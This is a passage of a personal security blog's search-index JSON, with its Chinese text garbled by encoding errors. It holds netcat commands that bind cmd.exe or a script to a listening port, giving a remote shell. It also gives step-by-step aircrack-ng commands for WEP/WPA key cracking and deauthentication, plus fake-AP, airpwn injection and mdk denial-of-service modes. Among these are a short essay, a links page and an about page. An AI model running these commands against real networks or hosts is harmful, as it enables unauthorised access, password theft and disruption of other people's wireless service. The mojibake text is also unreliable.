-da ture.ip -dp 22 ä»£ç†æœåŠ¡å™¨netcatWindows: 1nc.exe -d -L -p 1234 -e cmd.exe Remote: 1nc -l -p 1234 locale: 1nc -d remore port -e cmd.exe Nc realy:ï¼ˆåˆ©ç”¨è„šæœ¬å®ç°ï¼‰ï¼Œå°±æ˜¯ä¸€ç§é‡å®šå‘ï¼ŒæŒ‡å®šçš„æ•°æ®æµè½¬å‘ï¼Œè¿˜å¯ä»¥æŠŠä¼ è¾“çš„ä¿¡æ¯ dump ä¸€æ¬¡ã€‚ 123#!/bin/bashnc -o output.file ip_addr portnc -l -p 23 -e script.sh","tags":["security"]},{"title":"a curious mind","path":"/2014/08/19/a-curious-mind/","content":"å¾ç”Ÿä¹Ÿæœ‰æ¶¯ï¼Œè€ŒçŸ¥ä¹Ÿæ— æ¶¯ã€‚ æœ‰æ—¶å€™æˆ‘å¾ˆå›°æƒ‘ï¼Œæˆ‘é—®ä¸åŒäººç›¸åŒçš„é—®é¢˜ï¼Œä¸åŒçš„äººä¸ºæˆ‘è§£ç­”ï¼Œå°½ç®¡ä»–ä»¬è¯´çš„ä¸ä¸€æ ·ï¼Œä½†ä¾ç„¶è®¤ä¸ºä»–ä»¬è¯´çš„æ˜¯å¯¹çš„ï¼Œå¥½åƒæˆè¯­æ•…äº‹â€ç›²äººæ‘¸è±¡â€, ä¹Ÿè®¸ä»–ä»¬å°±æ˜¯æ‘¸è±¡çš„ç›²äººï¼Œä»–ä»¬ç«­åŠ›ä¸ºæˆ‘è¿™ä¸ªå‡†å¤‡å»æ‘¸åƒçš„ç›²äººæè¿°ä»–ä»¬æ‘¸åˆ°çš„ä¸œè¥¿ï¼Œæˆ–è’²æ‰‡ï¼Œæˆ–æŸ±å­ï¼Œæˆ–å¢™å£ã€‚é‚£ä¹ˆå­˜åœ¨èƒ½å®Œæ•´æè¿°å¤§è±¡çš„ç›²äººä¹ˆï¼Ÿæˆ‘ä»¬è¿™æ ·çš„çå­æ‘¸ç€è’²æ‰‡ï¼ŒæŸ±å­ï¼Œå¢™å£çš„ç»„åˆç‰©ä¼šè®¤ä¸ºé‚£æ˜¯å¤§è±¡ä¹ˆï¼Ÿ æ€•ä»€ä¹ˆçœŸç†æ— ç©·ï¼Œè¿›ä¸€å¯¸æœ‰ä¸€å¯¸çš„æ¬¢å–œã€‚ ä¹Ÿè®¸æˆ‘æ˜¯ä¸ªåŠ¡å®ä¸»ä¹‰è€…ï¼Œå¤šæ•°æ—¶é—´æˆ‘ä¼šå…‹åˆ¶å»æƒ³ä»€ä¹ˆå¤§è±¡ï¼ŒæŸ±å­ï¼Œç›²äººä¹‹é—´çš„äº‹æƒ…ã€‚é‡åˆ°é—®é¢˜æˆ‘è§£å†³é—®é¢˜ï¼Œå¯¹åˆ¨æ ¹é—®åº•çš„ç¨‹åº¦æœ‰ç€é™åˆ¶ï¼Œå› ä¸ºçŸ¥é“é‚£æ²¡æœ‰å°½å¤´ï¼Œä½†æœ‰æ—¶å€™åˆèƒ½ä»çªç ´å…‹åˆ¶ä¸­èƒ½è·å¾—ä¸€ç‚¹å¿«æ„Ÿï¼ŒäººçœŸæ˜¯æœ‰ç—…ã€‚","tags":["life"]},{"title":"wireless tools","path":"/2014/07/12/wireless_tools/","content":"0x00 net-wireless&#x2F;aircrack-ng airbase-ng: ä¸­é—´äººæ”»å‡»ï¼Œä¼ªé€  ap å¹¶ä¸”å°†æ— çº¿çš„æµé‡è½¬å‘åˆ°æœ‰çº¿ç½‘ç»œ aircrack-ng: ä¸»è¦ç”¨äº wep ä»¥åŠ wpa-psk çš„æ¢å¤ï¼Œä¾èµ–äº dump çš„æ•°æ®åŒ…ï¼Œæ­¤å·¥å…·å°±å¯ä»¥è‡ªåŠ¨æµ‹è¯•æ˜¯å¦å¯ä»¥ç ´è§£ airdecap-ng: ç”¨æ¥è§£å¼€åŠ å¯†çŠ¶æ€çš„æ•°æ®åŒ… airdecloak-ng: ç”¨äºåˆ†ææ— çº¿æ•°æ®æŠ¥æ–‡æ—¶è¿‡æ»¤å‡ºæŒ‡å®šæ— çº¿ç½‘ç»œæ•°æ® airdriver-ng: ç”¨æˆ·æŸ¥çœ‹å·¥å…·åŒ…æ”¯æŒçš„èŠ¯ç‰‡ airdrop-ng: åŸºäºç­–ç•¥çš„æ— çº¿ Deauth çš„å·¥å…· aireplay-ng: åœ¨è¿›è¡Œ wep å’Œ wap-psk çš„å¯†ç æ¢å¤æ—¶å€™ï¼Œå¯ä»¥æ ¹æ®éœ€è¦åˆ›å»ºç‰¹æ®Šçš„æ— çº¿æ•°æ®åŒ…æŠ¥æ–‡ airgraph-ng airmon-ng: ç½‘å¡ç›‘æ§æ¨¡å¼ airodump-ng: æŠ“å–ç©ºä¸­ä¼ æ’­çš„æ•°æ®åŒ… airolib-ng: è¿›è¡Œ wpa å½©è™¹è¡¨æ”»å‡»æ—¶ä½¿ç”¨ï¼Œç”¨äºå»ºç«‹ç‰¹å®šçš„æ•°æ®åº“æ–‡ä»¶ airserv-ng: å¯ä»¥å°†æ— çº¿ç½‘å¡è¿æ¥åˆ°ç‰¹å®šç«¯å£ï¼Œä¸ºæ”»å‡»æ—¶çµæ´»è°ƒç”¨å‡†å¤‡ airtun-ng: besside-ng easside-ng: ç”¨æˆ· wep çš„è‡ªåŠ¨ç ´è§£ packetforge-ng: ä¸»è¦ç”¨äºæ„é€ ç‰¹æ®Šçš„æ•°æ®åŒ…ï¼Œç”¨äºæ— å®¢æˆ·ç«¯çš„ç ´è§£ tkiptun-ng: ä¸»è¦é’ˆå¯¹ wpa tkip ä¸­å¯ç”¨ qos çš„ç½‘ç»œçš„æ³¨å…¥ wesside-ng æ–‡æ¡£é“¾æ¥ ^wiki 0x01 start interface monitor modeå‚æ•°è¯´æ˜ï¼š 1root@kail:~/wireless# airmon-ng start waln0 0x02 capture the wireless frameså‚æ•°è¯´æ˜ï¼š-w åé¢æ˜¯å†™å…¥æ–‡ä»¶ï¼Œâ€“ivs é…Œæƒ…ä½¿ç”¨ï¼Œ-c åé¢æ˜¯ä¿¡é“ 1root@kali:~/wireless# airodump-ng -w hg -c 6 mon0 0x03 generate requestwep çš„ Request æ³¨å…¥æ”»å‡»åŠ å¿«æœ‰æ•ˆçš„æ•°æ®åŒ…ç”Ÿæˆï¼Œå‚æ•°è¯´æ˜ï¼š-3 (â€“arpreplay) å°±æ˜¯æ”»å‡»ç¼–å·ï¼Œ-b åé¢æ˜¯ ap çš„ MACï¼Œ-h åé¢æ˜¯ Client çš„ MAC 1root@kali:~/wireless# aireplay-ng -3 -b 9C:21:6A:7E:2C:EC -h 64:5A:04:33:75:18 mon0 wap çš„ Deauth æ”»å‡»è·å– wpa çš„æ¡æ‰‹æŠ¥æ–‡ï¼šå‚æ•°è¯´æ˜ï¼š-0 (â€“deauth) å°±æ˜¯æ”»å‡»ç¼–å·ï¼Œåé¢æ˜¯æ•°æ®åŒ…æ•°é‡ï¼Œ-a åé¢æ˜¯ ap çš„ MACï¼Œ-c åé¢æ˜¯ Client çš„ MAC 1root@kali:~/wireless# aireplay-ng -0 1 -a 9C:21:6A:7E:2C:EC -c 64:5A:04:33:75:18 mon0 0x04 crack the passwordweb çš„ç ´è§£ï¼Œåé¢æ˜¯.cap æˆ–è€… ivs æ–‡ä»¶ 1root@kali:~/wireless# aircrack-ng hg-01.cap å¯¹äº wpa çš„ç ´è§£ï¼Œ-w åé¢æ˜¯å­—å…¸æ–‡ä»¶ 1root@kali:~/wireless# aircrack-ng -w /usr/share/dictionary/words hg-01.cap 0x05 aux tools.cap æå–.ivs æ–‡ä»¶ï¼š 1root@kali:~/wireless# ivstools --convert hg-05.cap hg-05.ivs æŠŠ.ivs æ–‡ä»¶åˆæˆä¸€ä¸ªï¼š 1root@kali:~/wireless# ivstools --merge hg-01.ivs hg-02.ivs hg-05.ivs hg.ivs è§£å¯†æ— çº¿æ•°æ®å¸§ï¼Œå‚æ•°è¯´æ˜ï¼š-l ä¸ç§»é™¤ 802.11 å¤´éƒ¨ 1root@kali:~/wireless# airdecap-ng -l -e ESSID -p password hg-01.cap çƒ­ç‚¹ä¼ªé€  1root@kali:~/wireless# airbase-ng -c 6 -A -Z 2 mon0 æ— çº¿è·³æ¿çš„å·¥å…· 12345678910111213# airserv-ng Airserv-ng 1.2 beta3 - (C) 2007, 2008, 2009 Andrea Bittauhttp://www.aircrack-ng.orgUsage: airserv-ng &lt;options&gt;Options: -h : This help screen -p &lt;port&gt; : TCP port to listen on (default:666) -d &lt;iface&gt; : Wifi interface to use -c &lt;chan&gt; : Channel to use -v &lt;level&gt; : Debug level (1 to 3; default: 1) åŸºäºç­–ç•¥çš„æ— çº¿ Deauthï¼Œä¸‹é¢ç­–ç•¥çš„è¯­æ³• 1234567#deny rulesd/0a:00:27:00:00:03|dc:0e:a1:f4:3f:01Deny\tAP Client#------------------a/any|any# wireless airdrop-ng -i mon0 -t hg-01.csv -r rule å¯¹æŠ“å–çš„æ•°æ®åŒ…å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼ˆå…¶å®å¯ä»¥åœ¨ dump æ—¶å€™ç”¨å‚æ•°æŒ‡å®šï¼‰ 1# wireless airdecloak-ng --bssid 0a:00:27:00:00:03 --filters signal -i hg-01.cap wps æ‰«æå·¥å…· è¿™é‡Œ ä¸‹è½½ï¼Œwpscan.py(æ‰«æå¼€å¯çš„æ— çº¿è·¯ç”±å™¨),wpspy.py(æ£€æµ‹ wps çš„çŠ¶æ€).fix: å¦‚æœè¿è¡Œå‡ºç°ï¼šCaught exception sniffing packets: global name â€˜sniffâ€™ is not defined è§£å†³æ–¹æ¡ˆï¼Œä¿®æ”¹ä¸€ä¸‹ python æ„é€ åŒ…çš„å€’å…¥ï¼Œæˆ‘ä¸‹é¢çš„æ–¹æ³•æ˜¯ç®€åŒ–çš„ï¼Œä½†æ˜¯æ„æ€ä¸€æ · 12345#!/usr/bin/env pythonfrom sys import argv, stderr, exitfrom getopt import GetoptError, getopt as GetOptfrom scapy.all import * æ— çº¿ dos å·¥å…·:mdk 1234567891011121314151617181920212223242526b\t- Beacon Flood Mode Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!a\t- Authentication DoS mode Sends authentication frames to all APs found in range. Too much clients freeze or reset some APs.p\t- Basic probing and ESSID Bruteforce mode Probes AP and check for answer, useful for checking if SSID has been correctly decloaked or if AP is in your adaptors sending range SSID Bruteforcing is also possible with this test mode.d\t- Deauthentication / Disassociation Amok Mode Kicks everybody found from APm\t- Michael shutdown exploitation (TKIP) Cancels all traffic continuouslyx\t- 802.1X testsw\t- WIDS/WIPS Confusion Confuse/Abuse Intrusion Detection and Prevention Systemsf\t- MAC filter bruteforce mode This test uses a list of known client MAC Adresses and tries to authenticate them to the given AP while dynamically changing its response timeout for best performance. It currently works only on APs who deny an open authentication request properlyg\t- WPA Downgrade test deauthenticates Stations and APs sending WPA encrypted packets. With this test you can check if the sysadmin will try setting his network to WEP or disable encryption. æ— çº¿æ¬ºéª— net-wireless&#x2F;airpwn, é€šè¿‡æ— çº¿æ•°æ®åŒ…åŒ¹é…çš„åœ°æ–¹ä¿®æ”¹æ›¿æ¢æ‰ï¼Œå¹¶ä¸”ä¼ªè£…ä¸º AP å‘é€æ•°æ® 12345# cat /usr/share/airpwn/conf/js_html begin js_htmlmatch ^(GET|POST)ignore ^GET [^ ?]+\\.(jpg|jpeg|gif|png|tif|tiff)response /usr/share/airpwn/content/js_html è¯­æ³•ç±»ä¼¼ 1# airpwn -c /usr/share/airpwn/conf/greet_html -i mon0 -d mac80211 -vvv -F é’ˆå¯¹ open çš„ï¼Œ-k å‚æ•°åé¢å¯ä»¥åŠ  wep çš„å¯†ç ï¼Œwap æ²¡æœ‰çœ‹åˆ°å‚æ•°ã€‚","tags":["security"]},{"path":"/wiki/ws-proxy/index.html","content":"hi all. the Goooop is a simple go reverse proxy"},{"title":"links","path":"/friends/index.html","content":"philo jy å·¨å·¨çš„åšå®¢,ä¸»è¦å…³æ³¨ linux ä¸è¿ç»´è‡ªåŠ¨åŒ–. æ‘©äº‘é£ sf å·¨å·¨,å…³æ³¨åˆ†å¸ƒå¼è®¡ç®—,æ¶ˆæ¯é˜Ÿåˆ—æŠ€æœ¯. shu-mj mj å·¨å·¨ç®—æ³•å¤§ç¥"},{"title":"About","path":"/about/index.html","content":"æˆ‘æ˜¯è°ï¼Ÿ Linux ä¸ è½¯ä»¶å®‰å…¨ çˆ±å¥½è€…ã€‚ RHCA è®¤è¯æŒæœ‰è€…ã€‚ å°±èŒäºç½‘æ˜“æ¸¸æˆåŸºç¡€æ¶æ„éƒ¨é—¨ã€‚ ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªåšå®¢ï¼Ÿ ä¸€æ¥è®°å¿†æœ‰æ—¶ä¸å‡†,ä»¥åšå®¢æ¥è®°å½•å­¦ä¹ ä»¥ä¾¿æŸ¥é˜…,å¦‚æœ‰é”™è¯¯è¿˜æœ›æŒ‡æ­£ã€‚ äºŒæ¥ç»“è¯†åŒé“ä¸­äºº,ç‹¬å­¦è€Œæ— å‹ï¼Œå¥½æ¯”é—­é—¨é€ è½¦,å¸Œæœ›å’Œå¤§å®¶ä¸€èµ·è¿›æ­¥ã€‚"},{"path":"/wiki/linux-exp-dev/index.html","content":"a linux exploit develop guide for newbiw"}]